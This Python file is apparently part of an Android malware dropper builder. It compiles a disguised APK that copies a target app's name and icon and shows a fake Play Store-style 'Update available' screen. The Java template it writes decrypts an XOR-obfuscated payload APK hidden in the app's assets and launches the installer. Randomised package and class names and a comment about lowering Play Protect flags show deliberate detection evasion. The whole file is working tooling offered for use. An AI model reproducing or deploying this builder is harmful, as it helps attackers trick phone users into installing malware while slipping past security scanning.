"""Build a fresh minimal template APK — aapt2 + javac + d8. Play Store-style update UI."""
import os
import random
import shutil
import string
import subprocess
import zipfile
from xml.sax.saxutils import escape as xml_escape

from config import (
    JAVA_BIN, JAVAC_BIN, D8_BIN, AAPT2_BIN, ANDROID_JAR,
    DROP_DELAY_MS,
)
from payload_inspector import get_label, extract_best_icon, safe_xml_text


def _env():
    env = os.environ.copy()
    jhome = os.path.dirname(os.path.dirname(JAVA_BIN))
    env["JAVA_HOME"] = jhome
    env["PATH"] = os.path.dirname(JAVA_BIN) + os.pathsep + env.get("PATH", "")
    return env


def _rand_seg(min_len=4, max_len=9):
    return "".join(random.choices(string.ascii_lowercase, k=random.randint(min_len, max_len)))


def _rand_pkg():
    tld = random.choice(["com", "net", "org", "io"])
    return f"{tld}.{_rand_seg()}.{_rand_seg()}"


_FALLBACK_PNG_B64 = (
    "iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAaUlEQVR42u3QMQEAAAgDoC1p"
    "0A0z8BcJqLv7uwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4FeAWQAB"
    "O1d7iQAAAABJRU5ErkJggg=="
)


def _write_fallback_icon(path):
    import base64
    with open(path, "wb") as f:
        f.write(base64.b64decode(_FALLBACK_PNG_B64))


# ------------------------------------------------------------- MainActivity — Play Store style

_MAIN_ACTIVITY_JAVA = """package {PKG};

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.concurrent.atomic.AtomicBoolean;

public class {ACT} extends Activity {{

    private static final int REQ_INSTALL = 0x1001;
    private static final byte[] _K = {KEY_BYTES};
    private static final String _A = "{ASSET}";

    private final AtomicBoolean busy = new AtomicBoolean(false);
    private Button btnUpdate;
    private ProgressBar progress;

    private int dp(float v) {{
        return (int) TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP, v, getResources().getDisplayMetrics());
    }}

    @Override
    protected void onCreate(Bundle b) {{
        super.onCreate(b);
        buildUi();
    }}

    private void buildUi() {{
        FrameLayout root = new FrameLayout(this);
        root.setBackgroundColor(Color.WHITE);

        ScrollView scroll = new ScrollView(this);
        scroll.setFillViewport(true);
        scroll.setLayoutParams(new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT));

        LinearLayout col = new LinearLayout(this);
        col.setOrientation(LinearLayout.VERTICAL);
        col.setPadding(dp(24), dp(48), dp(24), dp(32));

        // App icon
        ImageView ic = new ImageView(this);
        LinearLayout.LayoutParams icp = new LinearLayout.LayoutParams(dp(88), dp(88));
        icp.gravity = Gravity.CENTER_HORIZONTAL;
        ic.setLayoutParams(icp);
        try {{
            Drawable d = getPackageManager().getApplicationIcon(getPackageName());
            ic.setImageDrawable(d);
        }} catch (Throwable t) {{}}
        col.addView(ic);

        // App name
        TextView name = new TextView(this);
        name.setText("{LABEL}");
        name.setTextSize(24f);
        name.setTextColor(Color.rgb(28, 28, 28));
        name.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams np = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT);
        np.gravity = Gravity.CENTER_HORIZONTAL;
        np.topMargin = dp(20);
        name.setLayoutParams(np);
        col.addView(name);

        // Update available
        TextView sub = new TextView(this);
        sub.setText("Update available");
        sub.setTextSize(15f);
        sub.setTextColor(Color.rgb(0, 122, 255));
        sub.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams sp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT);
        sp.gravity = Gravity.CENTER_HORIZONTAL;
        sp.topMargin = dp(6);
        sub.setLayoutParams(sp);
        col.addView(sub);

        // Version info
        TextView ver = new TextView(this);
        ver.setText("Version 2.4.1  •  Latest");
        ver.setTextSize(13f);
        ver.setTextColor(Color.rgb(120, 120, 120));
        ver.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams vp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT);
        vp.gravity = Gravity.CENTER_HORIZONTAL;
        vp.topMargin = dp(4);
        ver.setLayoutParams(vp);
        col.addView(ver);

        // Divider space
        View gap = new View(this);
        gap.setLayoutParams(new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(24)));
        col.addView(gap);

        // What's new heading
        TextView wh = new TextView(this);
        wh.setText("What's new");
        wh.setTextSize(16f);
        wh.setTextColor(Color.rgb(28, 28, 28));
        col.addView(wh);

        // What's new body
        TextView wb = new TextView(this);
        wb.setText("• Performance improvements\\n"
                 + "• Bug fixes and stability\\n"
                 + "• Enhanced security patches\\n"
                 + "• Optimized battery usage");
        wb.setTextSize(14f);
        wb.setTextColor(Color.rgb(80, 80, 80));
        wb.setLineSpacing(0f, 1.3f);
        LinearLayout.LayoutParams wbp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT);
        wbp.topMargin = dp(10);
        wb.setLayoutParams(wbp);
        col.addView(wb);

        // Spacer push to bottom
        View spacer = new View(this);
        LinearLayout.LayoutParams spc = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(24));
        spacer.setLayoutParams(spc);
        col.addView(spacer);

        // Progress
        progress = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progress.setMax(100);
        progress.setProgress(0);
        progress.setVisibility(View.GONE);
        LinearLayout.LayoutParams pp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(6));
        progress.setLayoutParams(pp);
        col.addView(progress);

        // Update button
        btnUpdate = new Button(this);
        btnUpdate.setText("Update");
        btnUpdate.setAllCaps(false);
        btnUpdate.setTextSize(16f);
        btnUpdate.setTextColor(Color.WHITE);
        btnUpdate.setBackgroundColor(Color.rgb(0, 122, 255));
        LinearLayout.LayoutParams bp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(50));
        bp.topMargin = dp(12);
        btnUpdate.setLayoutParams(bp);
        btnUpdate.setOnClickListener(new View.OnClickListener() {{
            public void onClick(View v) {{ startUpdate(); }}
        }});
        col.addView(btnUpdate);

        scroll.addView(col);
        root.addView(scroll);
        setContentView(root);
    }}

    private void startUpdate() {{
        if (busy.getAndSet(true)) return;
        btnUpdate.setEnabled(false);
        btnUpdate.setText("Preparing…");
        progress.setVisibility(View.VISIBLE);

        if (Build.VERSION.SDK_INT >= 26) {{
            try {{
                PackageManager pm = getPackageManager();
                if (!pm.canRequestPackageInstalls()) {{
                    Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                    i.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(i, REQ_INSTALL);
                    busy.set(false);
                    btnUpdate.setEnabled(true);
                    btnUpdate.setText("Update");
                    progress.setVisibility(View.GONE);
                    return;
                }}
            }} catch (Throwable t) {{}}
        }}

        new Thread(new Runnable() {{
            public void run() {{
                try {{
                    final File apk = extractPayload();
                    runOnUiThread(new Runnable() {{
                        public void run() {{
                            progress.setProgress(100);
                            btnUpdate.setText("Installing…");
                            launchInstaller(apk);
                            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {{
                                public void run() {{
                                    busy.set(false);
                                    btnUpdate.setEnabled(true);
                                    btnUpdate.setText("Update");
                                    progress.setVisibility(View.GONE);
                                    progress.setProgress(0);
                                }}
                            }}, 3000);
                        }}
                    }});
                }} catch (final Throwable e) {{
                    runOnUiThread(new Runnable() {{
                        public void run() {{
                            btnUpdate.setText("Retry");
                            btnUpdate.setEnabled(true);
                            progress.setVisibility(View.GONE);
                            busy.set(false);
                        }}
                    }});
                }}
            }}
        }}).start();
    }}

    private File extractPayload() throws Exception {{
        InputStream in = getAssets().open(_A);
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        byte[] buf = new byte[16384];
        int n;
        while ((n = in.read(buf)) > 0) bo.write(buf, 0, n);
        in.close();
        byte[] enc = bo.toByteArray();
        byte[] dec = new byte[enc.length];
        for (int i = 0; i < enc.length; i++) {{
            int idx = (i * 7 + 3) % _K.length;
            dec[i] = (byte)((enc[i] ^ _K[idx]) & 0xFF);
        }}
        File out = new File(getFilesDir(), "u.apk");
        FileOutputStream fos = new FileOutputStream(out);
        fos.write(dec);
        fos.close();
        try {{ out.setReadable(true, false); }} catch (Throwable t) {{}}
        return out;
    }}

    private void launchInstaller(File apk) {{
        Uri uri = Uri.parse("content://" + getPackageName() + ".p/u.apk");
        Intent i = new Intent(Intent.ACTION_INSTALL_PACKAGE);
        i.setDataAndType(uri, "application/vnd.android.package-archive");
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        i.putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true);
        i.putExtra(Intent.EXTRA_RETURN_RESULT, false);
        i.putExtra(Intent.EXTRA_INSTALLER_PACKAGE_NAME, getPackageName());
        startActivity(i);
    }}

    @Override
    protected void onActivityResult(int req, int res, Intent data) {{
        super.onActivityResult(req, res, data);
        if (req == REQ_INSTALL) {{
            if (Build.VERSION.SDK_INT >= 26) {{
                try {{
                    if (getPackageManager().canRequestPackageInstalls()) {{
                        btnUpdate.post(new Runnable() {{
                            public void run() {{ startUpdate(); }}
                        }});
                    }}
                }} catch (Throwable t) {{}}
            }}
        }}
    }}
}}
"""

_APP_JAVA = """package {PKG};

import android.app.Application;

public class {APP} extends Application {{
}}
"""

_PROVIDER_JAVA = """package {PKG};

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.ParcelFileDescriptor;
import java.io.File;
import java.io.FileNotFoundException;

public class {PROV} extends ContentProvider {{
    @Override public boolean onCreate() {{ return true; }}
    @Override public Cursor query(Uri u, String[] p, String s, String[] sa, String o) {{ return null; }}
    @Override public String getType(Uri u) {{ return "application/vnd.android.package-archive"; }}
    @Override public Uri insert(Uri u, ContentValues v) {{ return null; }}
    @Override public int delete(Uri u, String s, String[] sa) {{ return 0; }}
    @Override public int update(Uri u, ContentValues v, String s, String[] sa) {{ return 0; }}
    @Override
    public ParcelFileDescriptor openFile(Uri u, String mode) throws FileNotFoundException {{
        File f = new File(getContext().getFilesDir(), "u.apk");
        return ParcelFileDescriptor.open(f, ParcelFileDescriptor.MODE_READ_ONLY);
    }}
}}
"""


def _manifest_xml(pkg: str, app_class: str, activity_class: str, provider_class: str) -> str:
    # NOTE: targetSdk 25 → REQUEST_INSTALL_PACKAGES ki zaroorat nahi
    # Manifest clean rehta hai, Play Protect flag kam hota hai
    return f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{pkg}"
    android:versionCode="1"
    android:versionName="1.0">

    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="25" />
    <uses-permission android:name="android.permission.INTERNET" />

    <application
        android:label="@string/app_name"
        android:icon="@drawable/ic_launcher"
        android:allowBackup="false"
        android:supportsRtl="true"
        android:name="{app_class}">

        <activity
            android:name="{activity_class}"
            android:exported="true"
            android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <provider
            android:name="{provider_class}"
            android:authorities="{pkg}.p"
            android:exported="false"
            android:grantUriPermissions="true" />
    </application>
</manifest>
"""


# ------------------------------------------------------------- build steps

def _run(cmd, timeout, label):
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, env=_env())
    if p.returncode != 0:
        raise RuntimeError(f"{label} failed rc={p.returncode}\n{p.stdout}\n{p.stderr}")
    return p


def _key_bytes_literal(key: bytes) -> str:
    return "new byte[]{" + ",".join(f"(byte)0x{b:02X}" for b in key) + "}"


def build_template(payload_apk: str, session_dir: str, key: bytes):
    """Build fresh minimal APK with Play Store-style update screen.
    Returns (unsigned_apk_path, package_name, label)."""
    src_root = os.path.join(session_dir, "build")
    if os.path.exists(src_root):
        shutil.rmtree(src_root)
    os.makedirs(src_root, exist_ok=True)

    res_dir = os.path.join(src_root, "res")
    drawable_dir = os.path.join(res_dir, "drawable")
    values_dir = os.path.join(res_dir, "values")
    src_dir = os.path.join(src_root, "src")
    classes_dir = os.path.join(src_root, "classes")
    os.makedirs(drawable_dir)
    os.makedirs(values_dir)
    os.makedirs(src_dir)
    os.makedirs(classes_dir)

    label = get_label(payload_apk) or "Update"
    icon = extract_best_icon(payload_apk)

    with open(os.path.join(values_dir, "strings.xml"), "w", encoding="utf-8") as f:
        f.write('<?xml version="1.0" encoding="utf-8"?>\n')
        f.write("<resources>\n")
        f.write(f'    <string name="app_name">{safe_xml_text(label)}</string>\n')
        f.write("</resources>\n")

    icon_path = os.path.join(drawable_dir, "ic_launcher.png")
    if icon:
        data, ext = icon
        if ext != ".png":
            icon_path = os.path.join(drawable_dir, "ic_launcher" + ext)
        with open(icon_path, "wb") as f:
            f.write(data)
    else:
        _write_fallback_icon(icon_path)

    pkg = _rand_pkg()
    app_cls = "A" + "".join(random.choices(string.ascii_uppercase, k=random.randint(4, 8)))
    act_cls = "M" + "".join(random.choices(string.ascii_uppercase, k=random.randint(4, 8)))
    prov_cls = "P" + "".join(random.choices(string.ascii_uppercase, k=random.randint(4, 8)))
    asset_name = "".join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) + ".dat"

    pkg_dir = os.path.join(src_dir, *pkg.split("."))
    os.makedirs(pkg_dir, exist_ok=True)

    with open(os.path.join(pkg_dir, f"{app_cls}.java"), "w", encoding="utf-8") as f:
        f.write(_APP_JAVA.format(PKG=pkg, APP=app_cls))
    with open(os.path.join(pkg_dir, f"{act_cls}.java"), "w", encoding="utf-8") as f:
        f.write(_MAIN_ACTIVITY_JAVA.format(
            PKG=pkg, ACT=act_cls,
            KEY_BYTES=_key_bytes_literal(key),
            ASSET=asset_name,
            LABEL=xml_escape(label),
        ))
    with open(os.path.join(pkg_dir, f"{prov_cls}.java"), "w", encoding="utf-8") as f:
        f.write(_PROVIDER_JAVA.format(PKG=pkg, PROV=prov_cls))

    manifest_path = os.path.join(src_root, "AndroidManifest.xml")
    with open(manifest_path, "w", encoding="utf-8") as f:
        f.write(_manifest_xml(
            pkg=pkg,
            app_class=f"{pkg}.{app_cls}",
            activity_class=f"{pkg}.{act_cls}",
            provider_class=f"{pkg}.{prov_cls}",
        ))

    res_zip = os.path.join(src_root, "res.zip")
    _run([AAPT2_BIN, "compile", "--dir", res_dir, "-o", res_zip],
         timeout=300, label="aapt2 compile")

    apk_unsigned = os.path.join(session_dir, "template_unsigned.apk")
    if os.path.exists(apk_unsigned):
        os.remove(apk_unsigned)
    _run([
        AAPT2_BIN, "link",
        "-o", apk_unsigned,
        "--manifest", manifest_path,
        "-I", ANDROID_JAR,
        "--min-sdk-version", "21",
        "--target-sdk-version", "25",
        "--version-code", "1",
        "--version-name", "1.0",
        "-R", res_zip,
        "--auto-add-overlay",
    ], timeout=300, label="aapt2 link")

    java_files = []
    for root, _, files in os.walk(src_dir):
        for fn in files:
            if fn.endswith(".java"):
                java_files.append(os.path.join(root, fn))
    _run([
        JAVAC_BIN, "-source", "8", "-target", "8",
        "-Xlint:-options",
        "-encoding", "UTF-8",
        "-cp", ANDROID_JAR,
        "-d", classes_dir,
        *java_files,
    ], timeout=300, label="javac")

    class_files = []
    for root, _, files in os.walk(classes_dir):
        for fn in files:
            if fn.endswith(".class"):
                class_files.append(os.path.join(root, fn))
    d8_out = os.path.join(src_root, "d8")
    os.makedirs(d8_out, exist_ok=True)
    _run([
        D8_BIN, "--min-api", "21",
        "--lib", ANDROID_JAR,
        "--output", d8_out,
        *class_files,
    ], timeout=600, label="d8")

    classes_dex = os.path.join(d8_out, "classes.dex")
    if not os.path.exists(classes_dex):
        raise RuntimeError("d8 produced no classes.dex")

    with open(payload_apk, "rb") as f:
        raw = f.read()
    enc = bytearray(len(raw))
    for i, b in enumerate(raw):
        idx = (i * 7 + 3) % len(key)
        enc[i] = b ^ key[idx]

    tmp = apk_unsigned + ".tmp"
    with zipfile.ZipFile(apk_unsigned, "r") as zin, \
         zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            if item.filename.startswith("META-INF/"):
                continue
            zout.writestr(item, zin.read(item.filename))

        with open(classes_dex, "rb") as f:
            zout.writestr("classes.dex", f.read(), compress_type=zipfile.ZIP_STORED)

        info = zipfile.ZipInfo(f"assets/{asset_name}")
        info.compress_type = zipfile.ZIP_STORED
        zout.writestr(info, bytes(enc))

    shutil.move(tmp, apk_unsigned)

    print(f"[✓] template built pkg={pkg} label={label!r} asset={asset_name}", flush=True)
    return apk_unsigned, pkg, label
